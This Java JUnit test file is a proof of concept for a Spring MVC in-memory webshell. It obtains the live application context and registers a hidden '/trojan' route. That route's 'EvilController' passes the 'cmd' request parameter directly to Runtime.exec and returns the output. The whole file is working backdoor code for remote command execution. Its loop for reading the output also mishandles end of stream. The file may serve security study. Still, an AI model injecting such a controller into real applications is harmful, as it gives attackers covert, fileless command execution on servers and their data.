package com.endlessshw.springapi.test;

import org.junit.jupiter.api.Test;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

/**
 * @author hasee
 * @version 1.0
 * @description: PoC 测试的类
 * @date 2025/1/18 22:36
 */
public class PoCTest {
    @Test
    public void testPrimaryPoC() throws Exception{
        // 1. 恶意 Controller 实例化
        EvilController evilController = new EvilController();
        // 2. 创建 RequestMappingInfo
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        RequestMappingInfo.Builder builder = RequestMappingInfo.paths("/trojan").methods(RequestMethod.GET);
        RequestMappingInfo requestMappingInfo = builder.options(new RequestMappingInfo.BuilderConfiguration()).build();
        // 3. 拿到 `MappingRegistry`，然后调用其 `register()` 完成注册和路由映射
        Method cmdMethod = evilController.getClass().getMethods()[0];
        requestMappingHandlerMapping.registerMapping(requestMappingInfo, "evilController", cmdMethod);
    }

    /**
     * 恶意 Controller
     */
    @Controller
    public class EvilController{
        @ResponseBody
        public String cmd(@RequestParam("cmd") String cmd) throws Exception {
            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            StringBuilder result = new StringBuilder();
            String line = bufferedReader.readLine();
            result.append(line);
            while (!line.isEmpty()) {
                line = bufferedReader.readLine();
                result.append(line);
            }
            return result.toString();
        }
    }
}
